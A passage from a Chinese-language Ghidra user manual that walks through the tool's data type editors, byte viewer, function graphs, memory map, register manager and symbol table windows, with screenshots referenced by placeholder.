value：指定包入组成部分时最大的对齐值。</p><p><strong>未对齐的Union</strong></p><p>当一个Union未被对齐时，其大小就是其最大组成部分的大小。当将一个未对齐的Union放入其他数据类型时，对齐值会是1。</p><p><strong>对齐的Union</strong></p><p>一个对齐的Union的总大小至少是其最大组成部分的大小，其大小还会受到基于对齐和包入值的影响。与Structure的编辑器中相似地，我们可以在编辑器中对包入值和对齐值进行自定义。Union中所有组成部分的偏移都是0，所以包入值不会对组成部分的偏移造成影响。</p><p><strong>编辑操作*</strong>*</p><p>接下来我们会介绍在编辑器当中的具体操作。</p><p><strong>插入未定义字节</strong></p><p>点击下图所示的图标可插入未定义字节，需要注意的是未定义的字节只能被插入到未对齐的Structure当中。</p><p><img src="blob:file:///e69f4d78-fe62-4487-b18b-a29ddd50883b" alt="202004031012_XEBYYH28PFVVDSW.png"></p><p>图2-44</p><p><strong>上下的移动</strong></p><p>我们可以通过选中一个或一些组成部分并点击上下箭头的图标（如下图所示），来对被选中的组成部分进行向上或向下的移动。</p><p><img src="blob:file:///c6dfb78a-abc9-48f0-a80b-264c69e92ead" alt="202004031013_RCVZCVQB65A55PP.png"></p><p>图2-45</p><p><strong>复制组成部分</strong></p><p>我们可以复制Structure或Union中的组成部分。</p><p>1 选中想要复制的组成部分。</p><p>2 如果想要复制一份，选择下图中左边的图标；如果想要复制多份，选择右边的图标，这将弹出一个对话窗口，输入想要复制的份数。</p><p><img src="blob:file:///05cb3061-cf25-4a94-82fd-729b652e0fc1" alt="202004031013_RRP2B7WDJA8QKGT.png"></p><p>图2-46</p><p>3 复制的组成部分会紧挨着所选组成部分出现。</p><p><strong>创建数组</strong></p><p>1 选择一个组成部分。</p><p>2 按下形状为的Create Array按键。</p><p>3 这将弹出一个询问数组中元素个数的对话窗口，输入个数并选择OK。</p><p><img src="blob:file:///4e93adb5-780c-4749-9f16-4db646311378" alt="202004031013_E3M3WTYUX2QHBUQ.png"></p><p>图2-47 输入元素个数</p><p>4 所选的元素将会成为其数据类型的数组。</p><p>在一个Structure当中，我们可以从多个组成部分创建数组。第一个所选的组成部分的数据类型将会成为数组的数据类型。</p><p>1 选择多个组成部分。</p><p>2 按下形状为的Create Array按键。</p><p>3 一个数组将被创建。数组的数据类型将取决于第一个所选的组成部分。</p><p><strong>Enum 数据类型编辑器</strong></p><p>枚举（Enum）数据类型的编辑器更加简单。如下图所示。</p><p><img src="blob:file:///537b7684-a005-4d9c-8b4e-80969ea209ac" alt="202004031013_YYY24WFSW3GGUF8.png"></p><p>图2-48 Enum类型编辑器</p><p>我们可以通过右上角的图标，添加或删除枚举入口，并通过保存图标对修改进行保存。因为操作与Structure高度类似，我们便不再重复进行介绍。</p><p>#ghidra使用手册</p><p><strong>2.6 Console</strong></p><p> Console，即控制台，默认位于界面的最底部，用于输出信息。</p><p><img src="blob:file:///68d532b6-250f-4c8f-a6f0-6b9b63f6e73a" alt="202004031015_74GE4D5VVWZW976.png"></p><p>图2-49 控制台</p><p>任何插件都可以传递信息至控制台以显示。大部分情况下，控制台被用来显示脚本的输出。</p><p>我们可以通过控制台窗口右上方的小图标锁定窗口的自动滚动，或者清除控制台内容，更多关于脚本本身与控制台的内容我们会在后面介绍。</p><p>#ghidra使用手册</p><p><strong>3.1 Byte Viewer</strong></p><p>即字节查看器，可以将内存中的字节以多种形式展示。</p><p><img src="blob:file:///278b1cd3-0314-4ff7-9349-c81ffe407f1f" alt="202004031044_YG76959JNPEBADY.png"></p><p>图3-1 字节查看器</p><p>我们可以点击如下图所示的图标，或者选择Window→Bytes:…来打开字节查看器。</p><p><img src="blob:file:///7903c1f3-cb7e-41ea-b47a-5180381388c7" alt="202004031044_4G2PNVTRRCZG5E6.png"></p><p>图3-2 字节查看器图标</p><p><strong>3.1.1 数据格式</strong></p><p>我们在将在本节中讨论Ghidra提供的默认格式。我们可以点击字节查看器右上角的Set Byte Viewer Options图标来显示我们想要在查看器中展示的格式。</p><p><img src="blob:file:///bbd8ab58-f262-4e7e-8328-e7d6bb8c528f" alt="202004031044_M544YA9TAKS2EWM.png"></p><p>图3-3 更改显示格式</p><p><strong>Hex</strong></p><p>Hex，即十六进制的格式，将各个字节显示为一个两个字符的十六进制值。该格式支持对字节的编辑。</p><p><strong>Ascii</strong></p><p>将每个字节显示为其对应的Ascii字符。对于那些不存在于Ascii字符中的字节，查看器将其用.表示。该格式支持对字节的编辑。</p><p><strong>Address</strong></p><p>地址格式会确认字节所对应的地址是否在程序的内存范围。对于那些在内存范围内的地址，查看器会显示 <img src="blob:file:///2aacb2a0-2c71-4fdd-b277-182df4b4e768" alt="202004031045_2JKHN4QSM86Q2NY.png">图标。相对的，如果地址不在内存范围内，查看器会显示.。该格式不支持对字节的编辑。</p><p><strong>Disassembled</strong></p><p>反汇编格式对未定义的字节显示□。对于指令或定义的字节，查看器会显示.。通过查看该格式，我们可以清楚地看出程序哪些部分被反汇编了。该格式不支持对字节的编辑。</p><p><strong>HexInteger</strong></p><p>该格式将4个字节显示为一个8位的十六进制数。该格式支持对字节的编辑。</p><p><strong>Integer</strong></p><p>该格式将4个字节显示为一个十进制数。该格式不支持对字节的编辑。</p><p><strong>Octal</strong></p><p>该格式将各个字节显示为一个三个字符的八进制数。该格式支持对字节的编辑。</p><p><strong>Binary</strong></p><p>该格式将各个字节显示为一个八个字符的二进制数。该格式支持对字节的编辑。</p><p><strong>3.1.2 编辑内存</strong></p><p>通过以下操作开启对字节的编辑。</p><p>1 切换查看器中的 <img src="blob:file:///024a3cdf-eab4-43f0-b91b-9f1c034c9e0c" alt="202004031045_MNXRKHTXMZS392A.png">按键的状态至允许编辑。</p><p>2 选择一个支持编辑的格式。</p><p>3 当将光标放置于支持编辑的位置上时，光标会变为明显的颜色（此处为蓝色，默认配色为红色）。编辑过的字节也会显示为该颜色。</p><p><img src="blob:file:///78cd63b9-0f0a-43a0-aa95-b7ac0786c832" alt="202004031045_FTZTSH59QRK8KAR.png"></p><p>图3-4 编辑字节</p><p>只有在当前地址不包含指令时，我们才能够对字节进行编辑。如果尝试对包含指令的字节进行编辑，我们会被提示editing not allowed。</p><p><strong>3.1.3 查看器设置</strong></p><p>Byte Viewer Options，即图3-3所示的设置窗口。我们可以在其中对显示进行更改。</p><p><strong>Alignment Address</strong></p><p>该属性（对齐地址）指定了所显示地址应如何对齐。查看器会根据所提供的地址对地址的对齐自动进行修改。</p><p><strong>Bytes Per Line</strong></p><p>该属性（每行的字节数）指定了查看器中每行显示的字节个数。默认的值是16。需要注意的是，诸如HexInteger和Integer这样的格式，将字节4个一组的显示，如果每行的字节数不是4的倍数，而我们又勾选显示了这两个格式，查看器将弹出一个错误信息。</p><p><strong>Set Group Size</strong></p><p>该属性只对Hex格式生效，它指定了将十六进制格式的字节几个一组显示。</p><p>#ghidra使用手册</p><p><strong>3.2 Comments</strong></p><p>在第二章中我们介绍过在反编译窗口，或是陈列窗口中添加注释。我们可以通过Window→Comments来打开一个显示所有注释的窗口。</p><p><img src="blob:file:///3cbe2b45-d099-475c-ab4a-163a93e3d192" alt="202004031046_SQV7RJPEGDK93WY.png"></p><p>图3-5 注释窗口</p><p>我们可以在其中看到所有注释的位置、类型以及内容，通过点击某条注释，我们便可以在CodeBrowser中导航到相应的位置。</p><p>#ghidra使用手册</p><p><strong>3.3 Bookmarks</strong></p><p>在2.1.3当中，我们介绍了如何添加书签（Bookmarks），Ghidra同样提供了对于书签进行统一管理的窗口。选择Window→Bookmarks来将其打开。</p><p><img src="blob:file:///90ab3df1-bafc-4ed4-99cb-eef640cd4830" alt="202004031047_XDCZN24UMMQQHZ2.png"></p><p>图3-6 书签窗口</p><p>书签窗口列出了程序当中所有的书签，并显示标签的类型、分类、描述、地址、标签、书签放置位置的代码单元。我们可以通过点击任意书签以在CodeBrowser当中进行导航。</p><p><strong>3.3.1 书签过滤器</strong></p><p>我们可以通过对过滤器进行设置来决定书签窗口中显示的内容。点击窗口中的 <img src="blob:file:///fe9fd416-44a4-4120-9a38-1bd611de9bfd" alt="202004031047_5YNNPK8YRVV2FTZ.png">图标打开过滤器设置窗口。</p><p><img src="blob:file:///db9a69d7-15c2-4548-aa26-dc36911c12c8" alt="202004031048_C4J7WV2YDGT7SXQ.png"></p><p>图3-7 过滤器设置窗口</p><p>我们可以简单地通过勾选或是取消勾选来决定显示什么类型的书签。</p><p><strong>3.3.2 对书签的编辑</strong></p><p>需要注意的是，在书签表格当中，我们只能够对书签的Category和Description列进行编辑。双击想要编辑的位置便可对其进行编辑。</p><p><strong>3.3.3 移除书签</strong></p><p>1 选择想要移除的书签行。</p><p>2 按下Delete按键，或是在书签窗口中点击 <img src="blob:file:///d7300c64-8e34-409b-afbb-cca766a1fffa" alt="202004031049_PY9AV9PB2C792GF.png">图标。</p><p>#ghidra使用手册</p><p><strong>3.4 Data Type Preview</strong></p><p>数据类型预览（Data Type Preview），提供了对某个地址上数据类型的预览。我们可以通过Window→Data Type Preview来开启数据类型预览。当我们在陈列窗口移动光标时，数据类型预览也会随之更新。如果预览中出现了一个有效的地址，我们可以双击并在陈列窗口中导向至该地址。</p><p><img src="blob:file:///94898c87-f5b5-4040-852f-4436296d4771" alt="202004031053_3GKKC7354686ADQ.png"></p><p>图3-8 数据类型预览</p><p><strong>3.4.1 添加与移除数据类型</strong></p><p>点击数据类型预览窗口右上角的+图标，可以选择数据类型的对话窗口。此外，我们可以从数据类型管理器中拖动类型至数据类型预览窗口当中。需要注意的是，数据类型预览窗口不支持动态数据类型。</p><p>如果想要移除某个数据类型，选中并点击 <img src="blob:file:///d7300c64-8e34-409b-afbb-cca766a1fffa" alt="202004031049_PY9AV9PB2C792GF.png">图标。</p><p>#ghidra使用手册</p><p><strong>3.5 Defined Data</strong></p><p>我们可以通过数据窗口显示当前程序中定义的数据，我们可以选择Window→Defined Data来打开该窗口。</p><p><img src="blob:file:///affbf168-9d35-4117-ba33-e163824f2eca" alt="202004031055_33WKDX8KANCR94W.png"></p><p>图3-9 数据窗口</p><p>数据窗口中有四列。Data列显示了该数据的字符串表现形式。Location列显示了其位置。Type列显示了该数据的数据类型。Size列显示了该数据的大小（字节）。我们可以通过点击某一列的顶部来以该列内容排序。我们同样可以通过点击某一行以在CodeBrowser当中导向至相应数据的位置。</p><p><strong>3.5.1 过滤器设置</strong></p><p>我们可以点击数据窗口上方的 <img src="blob:file:///fe9fd416-44a4-4120-9a38-1bd611de9bfd" alt="202004031047_5YNNPK8YRVV2FTZ.png">图标来调出一个设置数据过滤器的对话窗口。</p><p><img src="blob:file:///20ba336d-5d84-4da0-9648-5d320f43bb8e" alt="202004031056_D4CVWAKEE3CKVM8.png"></p><p>图3-10 过滤器设置</p><p>我们可以在Filter Enable选项中选择是否开启该过滤器。我们可以在Limit Data To选项中选择：</p><p>1 Entire Program：显示程序中所有数据。</p><p>2 Current View：只显示CodeBrowser中当前内容中的数据。</p><p>3 Current Selection：只显示当前所选择内容当中的数据。</p><p>使用勾选框来选定想要显示的数据类型。</p><p>#ghidra使用手册</p><p><strong>3.6 Defined Strings</strong></p><p>字符串窗口能够显示所有程序当中定义的字符串。我们可以从Window→Defined Strings打开字符串窗口。</p><p><img src="blob:file:///2a17151c-d87d-45c1-94cb-5f350041e817" alt="202004031057_R25KWK6XN3FKJMW.png"></p><p>图3-11 字符串窗口</p><p>我们可以在其中点击字符串以在陈列窗口中导向至对应的位置。</p><p>字符串窗口有以下的列：</p><p>Location：字符串所在的位置。</p><p>String Value：字符串的值。</p><p>String Representation：字符串化的表现格式。</p><p>Data Type：该字符串的助记符或是数据类型。</p><p>Is Ascii：指示该字符串含不含有非ASCII字符的boolean型。</p><p>Has Encoding Error：指示该字符串含不含有不能通过字符集转换的字节的boolean型。这通常说明使用了错误的字符集或是该字符串并非真的是字符串。</p><p>Charset：该字符串所使用字符集的名字。</p><p>需要注意的是，Is Ascii、Has Encoding Error、和Charset列默认不会显示。我们需要右键点击列头并选择Add&#x2F;Remove Columns…来显示对应的列。</p><p>#ghidra使用手册</p><p><strong>3.7 Disassembled View</strong></p><p>反汇编窗口（Disassembled View）显示所选地址及其之上一小部分地址的反汇编。</p><p><img src="blob:file:///989f6ef7-5cdb-4700-bd29-fac005085247" alt="202004031058_PADBRDP5PK56RDM.png"></p><p>图3-12 反汇编窗口</p><p>我们点击Window→Disassembled View打开反汇编窗口。如上图所示，其中高亮所显示的行是我们在陈列窗口中所选的地址，而剩余的行则显示紧挨着所选地址的地址。反汇编窗口只会显示有效的地址预览，也就是说，如果窗口中显示是空的，则当前所选地址不是内存中有效的地址。</p><p>#ghidra使用手册</p><p><strong>3.8 Functions</strong></p><p>函数窗口(Functions Window)列出了程序当中定义的函数。我们可以点击Window→Functions将其打开。</p><p><img src="blob:file:///73b24c5a-b7c9-490e-818d-b3d84a34d645" alt="202004031059_PNWGC239ABDUVBQ.png"></p><p>图3-13 函数窗口</p><p>窗口当中有三个列：</p><p>Name：显示函数名。</p><p>Address：显示函数地址。</p><p>Function Signature：显示函数签名的预览。</p><p>点击某列的头来按照该列内容排序函数。我们也可以点击某个函数以在CodeBrowser中导向至对应位置。</p><p><strong>3.8.1 对比函数</strong></p><p>我们可以在函数窗口中对函数进行对比。</p><p>1 选择想要对比的两个或多个函数。</p><p>2 右键并选择Compare Selected Functions，或是直接点击位于窗口上方的 <img src="blob:file:///9d9e3fa3-1211-409d-9ee1-fc59c33ff9dc" alt="202004031059_QA5YKXEYK4V39D5.png">图标。</p><p>一个函数对比窗口将会弹出。</p><p>#ghidra使用手册</p><p><strong>3.9 Function Call Graph</strong></p><p>函数调用图（Function Call Graph）是一个对于当前函数收到和使用的函数调用的简单图像化展示窗口。这个功能可以帮助我们理解当前的函数在程序中的作用。我们可以点击Window→Function Call Graph来打开该窗口。</p><p><img src="blob:file:///15330b32-f32a-4bfb-bbce-df55e7adfa5a" alt="202004031100_DNSZ6BQ72JE62S2.png"></p><p>图3-14 函数调用图形</p><p><strong>3.9.1 显示与隐藏</strong></p><p>在函数调用图形中，我们可以按照需求隐藏或者显示函数调用。</p><p><img src="blob:file:///761f00f3-3a63-4528-998f-127ea3cbb2fc" alt="202004031101_S6DKG5YMZKHED37.png"></p><p>图3-15 显示与隐藏</p><p>如上图所示，我们可以通过点击一个节点上的-图标来隐藏其对应连接的路径，也可以通过点击+图标将其显示。需要注意的是，函数调用图形只是整个程序图形当中的一部分，我们看到的图形不是程序中所有的函数以及函数调用。</p><p><strong>3.9.2 导向</strong></p><p>在默认设置下（窗口右上角的Incoming Navigation为开启状态），双击一个节点便可以以其为中心显示函数调用图。我们也可以利用窗口左上角的左右箭头，来做基于浏览历史的导向。</p><p>#ghidra使用手册</p><p><strong>3.10 Function Graph</strong></p><p>函数图（Function Graph）是一个对陈列窗口中当前函数进行简单图形化的显示窗口。</p><p><img src="blob:file:///ee54a746-0f9b-4c14-9c97-85e83c553b9c" alt="202004031102_JDS2R3KH8PQUKUQ.png"></p><p>图3-16 函数图窗口</p><p>如上图所示，该窗口包含右下角的卫星视图以及除此之外的主要视图。</p><p><strong>3.10.1 主要视图</strong></p><p>主要视图中即除右下角卫星视图之外的部分。主要视图显示了代码块与控制流（箭头）。</p><p><strong>代码块</strong></p><p>每个图形中的矩形都代表了所选函数中的一部分代码（代码块）。我们可以通过左键点击选中代码块。如同Ghidra中其他工具中的选择一样，我们可以通过按住Ctrl键选择多个代码块。</p><p>我们可以通过鼠标滚轮缩放主要视图，也可以通过双击代码块的头部，将该代码块放大并居中显示。放大后，我们可以通过双击代码块当中的内容来进行相应的导向。</p><p><strong>组合代码块</strong></p><p>我们可以选择两个或者更多的代码块，并将它们组合成一个组合的代码块。这可以帮助我们将函数图变的更加简洁易读。下图中所示的代码块便是由三个代码块组合而成。</p><p><img src="blob:file:///c1d67edb-4c95-43e1-9360-18cff27fe73c" alt="202004031102_HPX6T8WPMZEKTKE.png"></p><p>图3-17 函数图窗口</p><p>选择两个或多个代码块，右键并选择Group Selected Vertices，一个标题为Enter Group Vertex Text的对话窗口将会弹出，这个对话窗口中的内容将会显示在组合的代码块中。默认情况下，其内容会列出所组合的代码块的标题（如上图所示）。</p><p>如果想要解除代码块的组合，选择组合而成的代码块，并右键点击Ungroup Selected Vertices。</p><p><strong>控制流</strong></p><p>箭头被用于显示从一个代码块到另一个的流。流分为三种。</p><p>1 Fallthrough：一个条件检查的否定情况。</p><p>2 Conditional：一个条件检查的肯定情况。</p><p>3 Unconditional：无条件的流。</p><p>我们可以通过颜色区分这三种流。在函数窗口中右键并选择Properties可以调出对颜色的自定义窗口。我们可以在其中确认以及修改这三种流所对应箭头的颜色。</p><p><img src="blob:file:///efb20046-8b4f-4350-bf60-3fa4baa6625f" alt="202004031102_R4FZCHE3H3JTW79.png"></p><p>图3-18 箭头颜色设置</p><p>与对代码块的选择一样，我们可以通过左键点击选中一个箭头，双击一个箭头将会导向至该控制流的终点，再次双击该箭头导向回控制流的起点。</p><p>我们可以将光标悬浮于控制流箭头上来获取信息，其中包括控制流的终点与起点的预览。</p><p><strong>3.10.2 卫星视图</strong></p><p>卫星视图提供了对于整个图的总览。我们也可以在卫星视图中对图整体的位置做出基本的调整。同时，卫星视图中还提示了当前主要视图中的位置位于整个函数图的哪里。我们可以通过勾选或取消勾选右键菜单中的Display Satellite View来决定是否显示卫星视图。</p><p>类似地，我们可以通过勾选或取消勾选右键菜单中的Dock Satellite View来决定是否将卫星视图镶嵌于主要视图的窗口当中。</p><p>#ghidra使用手册</p><p><strong>4.1 Equates Table</strong></p><p>这一章当中，我们会介绍剩下的一些使用机会相对少一些的功能窗口（因人因事而异）。</p><p>等量（Equates），即是在任意代码单元中对一个数值的字符串表示。比如说，在如下的指令当中：</p><p>MOV RAX, $0xf</p><p>数值$0xf可以被字符串EQUATES_SAMPLE代替，也即：</p><p>MOV RAX, EQUATES_SAMPLE</p><p>EQUATES_SAMPLE在这里便是$0xf的等值，也就是说，他们是相等的。</p><p><strong>4.1.1 设置等值</strong></p><p>我们可以在陈列窗口当中设置等值。</p><p><img src="blob:file:///a54b5112-82e6-479d-a900-7d099b882a63" alt="202004031104_3SYDTUKWK8C6VT5.png"></p><p>图4-1 设置等值</p><p>1 右键点击目标标量值，并选择Set Equate，或使用快捷键E。这将调出一个用于设置等值的对话窗口。</p><p>2 我们可以从已知的关联字符串当中选择，或是手动输入一个字符串。该字符串会成为目标标量的等值。</p><p>3 我们可以看到如下选项：</p><p>Current Location：将等值运用于当前所选位置。</p><p>Current Selection：只有当我们在程序中选中了一部分内容时，该选项才会被显示为可用。反之，就会如上图一样，选项为灰色。选中后字符串将会应用于所有选中的内容中的对应值。</p><p>Entire Program：等值会运用于整个程序当中的所有对应标量。</p><p>Overwrite existing equates：只有选择了Current Selection或Entire Program的情况下，该选项才可以被勾选。如果该选项被勾选，当前所选内容或是整个程序中所有对应的标量以及对应等值，将会被替换为现在给定的字符串。如果不勾选，只有那些还没有应用等值的标量，才会被替换为现在给定的字符串。</p><p><strong>4.1.2 查看等值</strong></p><p>等值表，即Equates Table的作用，便是用来查看等值以及他们的引用。我们可以选择Window→Equates Table来打开等值表。</p><p><img src="blob:file:///47b6a4a4-e06a-4843-a803-778708560749" alt="202004031104_427Z7DV8KK73BVB.png"></p><p>图4-2 等值表</p><p>左侧的面板列出了等值的名字、对应值、以及引用的次数。右侧的面板则列出了每次引用的地址。点击右侧面板中的地址可以让CodeBrowser导向至该地址。</p><p>我们可以在等值表中重命名等值，只需要双击名字并输入一个新的名字。</p><p>#ghidra使用手册</p><p><strong>4.2 Function Tag</strong></p><p>函数标签（Function Tag）窗口列出了当前打开程序的函数标签。该窗口也会显示当前选中函数的标签。标签可以由用户创建，也可以从预定义集中加载。我们可以选择Window→Function Tags来打开函数标签窗口。</p><p><img src="blob:file:///979e1cbc-2fe2-42b3-866e-c1978478dd87" alt="202004031106_8C6PBWWXW5EEHZR.png"></p><p>图4-3 函数标签窗口</p><p>如上图所示，该窗口分为五个区域：</p><p>Available Tags List：显示所有能够分配给当前函数的标签。</p><p>Assigned Tags List：显示所有已经分配给当前函数的标签。</p><p>Tag Input Field：允许用户创建新的标签，可以同时创建多标签。</p><p>Filter Field：筛选想要显示的标签。</p><p>Action Buttons：从上至下三个按钮分别能：</p><p>将选中的标签分配给当前函数；</p><p>从当前函数中移除选中的标签； <img src="blob:file:///fa42ca82-e076-4230-b10a-87651fe850ed" alt="202004031106_5ZCV63SYTSJ6YKM.png"></p><p>删除选中的标签并将其从所有函数中移除。</p><p><strong>4.2.1 标签操作</strong></p><p><strong>创建标签</strong></p><p>我们可以在上文中介绍的Tag Input Field当中创建标签。我们可以用逗号分隔一次性输入并创造多个标签。所有新建的标签将会被显示于Available Tags List当中，不会被分配给任何函数。</p><p><strong>删除标签</strong></p><p>选中想要删除的标签，并点击 <img src="blob:file:///eec75e83-da95-444b-b29c-d231f941e59a" alt="202004031106_X7REDK8WAQUHUY7.png">图标，一个用于确认的对话窗口将会弹出。如果确认删除，该标签会被删除并从所有函数中移除。</p><p><strong>编辑</strong></p><p>双击一个标签便可以对其进行编辑。从外部源导入的标签不能被编辑或删除。</p><p><strong>分配与移除</strong></p><p>我们可以通过上文中提到的左右箭头按钮，对所选的标签进行分配或移除。</p><p>#ghidra使用手册</p><p><strong>4.3 Memory Map</strong></p><p>内存映射（Memory Map）窗口显示了当前程序的内存结构。我们可以点击Window→Memory Map或是在工具栏中点击 <img src="blob:file:///b6859724-20d3-40b3-87d0-963cb421a013" alt="202004031107_SND6D9Y86WTEZF8.png">图标来打开内存映射窗口。</p><p><img src="blob:file:///d47c6079-46fb-4f67-8d24-2330661faf71" alt="202004031107_CVU9D99MJYP2PTY.png"></p><p>图4-4 内存映射窗口</p><p>Ghidra通过内存映射窗口支持四种不同的内存区块类型，分别是：</p><p>1 Default：普通的区块类型，可以是初始化的或未初始化的。</p><p>2 Bit Mapped：区块提供了“位可寻址”的映射到其他区块上。</p><p>3 Byte Mapped：区块提供了“字节可寻址”的映射到其他区块上。</p><p>4 Overlay：区块被创建于一个新的重叠的地址空间。</p><p><strong>4.3.1 显示内容</strong></p><p>内存映射窗口中每一列的内容如下：</p><p>Name：内存块的内容。</p><p>Start：内存块起始地址（十六进制）。</p><p>End：内存块结束地址（十六进制）。</p><p>Length：内存块长度（十六进制）。</p><p>R：读权限。</p><p>W：写权限。</p><p>X：执行权限。</p><p>Volatile：指示易失的I&#x2F;O内存。</p><p>Type：指示内存区块的类型（Default、Bit Mapped、Byte Mapped或是Overlay）。</p><p>Source：按照文件导入器生成这些字节填充该区块的文件名字。对于类别为Bit Mapped或是Byte Mapped的区块，Source会显示映射的源地址。</p><p>Comment：用户对该内存区块添加的注释。</p><p><strong>4.3.2 内存区块编辑</strong></p><p><strong>重命名</strong></p><p>我们可以在name列双击对所选区块进行重命名。</p><p><strong>更改权限</strong></p><p>利用R、W、X列中的勾选框对相应的权限进行更改。</p><p><strong>初始化内存区块</strong></p><p>我们可以通过勾选Initialized列的勾选框来初始化当前未初始化的内存区块。这将调出一个对话窗口，我们输入想要用来填充该内存区块的值。</p><p><img src="blob:file:///48e45e09-6b65-4b3a-b26f-b3938af6b482" alt="202004031108_HRPBDJ7YMZENRHH.png"></p><p>图4-5 指定填充值</p><p><strong>编辑注释</strong></p><p>我们可以双击内存映射窗口中的注释区域以编辑注释。注释最大长度为256个字符。</p><p><strong>4.3.3 内存区块操作</strong></p><p><strong>添加</strong></p><p>我们可以点击窗口右上角的+图标来添加内存区块，一个用于添加内存区块的对话窗口将会弹出。</p><p><img src="blob:file:///f6f18bc5-f9e5-4eca-a0de-ddc53629eb71" alt="202004031108_5UTUGJCXGK37JCE.png"></p><p>图4-6 添加</p><p>Block Name：新的内存区块的名称。</p><p>Start Addr：新的内存区块的起始地址。如果程序语言定义了多个地址空间，那么我们也需要指定地址空间。地址空间的选项在只有一个地址空间被定义时不会显示。</p><p>Length：新的内存区块的长度。</p><p>Comment：注释。</p><p>Read、Write、Execute：设置相应的权限。</p><p>Volatile：标记为易失性的I&#x2F;O内存。</p><p>Block Types：选择内存区块的类型。</p><p><strong>移动</strong></p><p>与添加操作类似，我们可以点击移动图标 <img src="blob:file:///c230271a-8911-445b-bd74-21d680772770" alt="202004031108_BC9ZBNPPVR87KKB.png">，调出移动内存区块的对话窗口。并在New Start Address与New End Address中填入新的起始地址。（如果输入新的起始地址，新的结束地址会被自动计算；如果输入新的结束地址，新的起始地址也会被自动计算）。</p><p><strong>分割</strong></p><p>选择Split图标 <img src="blob:file:///25fdcd48-1482-4105-b8d1-353011bb3df2" alt="202004031109_PYPJMHSH5CG3PXH.png">调出分割内存区块的对话窗口。我们有四种输入分割点的方式。</p><p>1 输入首个内存区块（block to split）的结束地址。</p><p>2 输入首个内存区块（block to split）的长度。</p><p>3 输入第二个内存区块（new block）的起始地址。</p><p>4 输入第二个内存区块（new block）的长度。</p><p><img src="blob:file:///7c3fc960-cbeb-4989-99cb-a00c30d1af58" alt="202004031109_GTT6P63T595WYD3.png"></p><p>图4-7 添加</p><p><strong>扩展</strong></p><p>我们可以选择 <img src="blob:file:///5b92da69-af65-4289-b71c-e6c04bc61a9f" alt="202004031109_6Y6YS3BJ3Q2KNES.png">图标来向上或向下对内存区块进行扩展。向上扩展时，在弹出的窗口中指定新的起始地址（New Start Address）；向下扩展时，在弹出的窗口中指定新的结束地址(New End Address)。</p><p>#ghidra使用手册</p><p><strong>4.4 Register Manager</strong></p><p>寄存器管理器Register Manager能够显示程序中不同地址中寄存器被分配的值。我们可以选择Window→Register Manager来将其打开。</p><p><img src="blob:file:///46fccc96-2d27-437d-9208-5be625a18f9d" alt="202004031110_ZXHDZMC4TGB327M.png"></p><p>图4-8 寄存管理器窗口</p><p>如上图所示，窗口的左侧包含了程序所有定义的寄存器。如果一些寄存器被语言按类别分组，同一组别的寄存器将在一个文件夹下。当我们在左侧选中了某个寄存器后，窗口的右侧会显示所选寄存器拥有分配的值的地址。</p><p><strong>4.4.1 编辑一个地址段的寄存器值</strong></p><p>我们可以在窗口右侧中双击一个地址段，这将调出一个编辑寄存器值的对话窗口。</p><p><img src="blob:file:///590353a1-2059-4777-92ac-755ea4215553" alt="202004031111_YDU4ZKZZHNJNQ6V.png"></p><p>图4-9 编辑寄存器值</p><p>我们可以在该对话窗口中调整起始与结束地址，并将在该地址的寄存器值进行更改。需要注意的是，如果我们指定了一个更小的地址段，被截断的地址部分会被有效地清除。如上图所示，如果我们将结束地址改为080482ef，那么080482ec至080482ef将拥有指定值0x8049ff4，而080482f0将不会拥有值。</p><p><strong>4.4.2 编辑寄存器在多个地址段中的值</strong></p><p>我们可以在陈列窗口当中右键点击一个寄存器，并在菜单中选择Set Register Values，或者直接按下Ctrl+R快捷键。这将弹出如下的对话窗口。</p><p><img src="blob:file:///9cf55f61-34b0-4e5d-a419-7cdb0476037a" alt="202004031111_SCNMVHRE6723W93.png"></p><p>图4-10 设置寄存器值</p><p>Address(es)栏中显示了将会受到本次改动影响的地址。我们在Value栏中输入指定的值，其默认格式是无符号的十六进制数，不过我们可以在临近的选择栏中选择格式。</p><p>类似地，我们可以通过在陈列窗口中右键点击一个寄存器，并选择Clear Register Values来清除寄存器在对应地址段的值，将受到影响的地址段同样会在Address(es)栏中显示。</p><p>#ghidra使用手册</p><p><strong>4.5 Relocation Table</strong></p><p>重定位表（Relocation Table）显示了程序当中定义的每一个重定位。重定位信息由自动导入器创建。我们可以选择Window→Relocaton Table将重定位表窗口打开。</p><p><img src="blob:file:///ef27a1e9-3bfe-48ca-963d-61be4b41fb4f" alt="202004031112_ZRNPW2AJK7KSXQN.png"></p><p>图4-11 重定位表</p><p>如上图所示，该窗口显示了以下几列信息，分别是：</p><p>Address：重定位被定义的位置。</p><p>Type：重定位的类型。</p><p>Values：重定位时所用的值。</p><p>Bytes：重定位时所用的原字节。</p><p>#ghidra使用手册</p><p><strong>4.6 Symbol Table &amp; Symbol References</strong></p><p>符号表（Symbol Table）显示了程序当中所定义的各个符号。符号，又被成为标签（Label），是名称与地址之间的关联。我们可以选择Window→Symbol Table来打开符号表。默认工具设定下，打开符号表的同时，符号引用表（Symbol References）也会被打开。如下图所示，显示在左侧的为符号表，显示在右侧的则是符号引用表。</p><p><img src="blob:file:///fce662b5-df8f-459f-b24d-a06afcb7b041" alt="202004031113_XPQQTRXV7H34JHC.png"></p><p>图4-12 符号表与符号引用表</p><p><strong>4.6.1 符号表</strong></p><p>符号表中的各列包括以下内容：</p><p>Label：符号的名字。</p><p>Location：符号所定义的地址。</p><p>Type：符号的类型（函数、外部、类，等等）。</p><p>Datatype：在符号地址所应用的数据类型。</p><p>Namespace：符号处的命名空间。</p><p>Source：标明符号的名字来自哪里。</p><p>Reference Count：对该符号的引用次数。</p><p><strong>文本过滤器</strong></p><p>我们可以使用符号表下方的文本过滤器。</p><p><img src="blob:file:///4b69dfa4-6a93-4f4e-ac51-9f6c5d865105" alt="202004031113_H5C43T3U2ZGD5GT.png"></p><p>图4-13 文本过滤器</p><p>我们可以在输入框右侧的图标中选择文本过滤的匹配模式，包括“以…打头”，“完全一致”和“正则表达式”。更右侧的Name Only勾选框决定应用过滤器至名字列或是所有列。</p><p><strong>过滤器</strong></p><p>除去文本过滤器，符号表还提供了更全面的过滤器。我们可以点击右上角的Configure Symbol Filter <img src="blob:file:///bffa37d6-02d6-4d09-ac5c-486aa99e4054" alt="202004031113_JCEQ7JD8XG856WG.png">图标来对过滤器进行配置。</p><p><img src="blob:file:///7fa04861-c4d4-4217-96d9-5ce02ddfd3c6" alt="202004031114_Z7R9QY8JEKVSEPR.png"></p><p>图4-14 过滤器设置</p><p>这将调出一个对话窗口。如上图所示，该窗口包含三个部分：Symbol Source（符号源）、Symbol Types（符号类型）和默认情况下被隐藏的Advanced 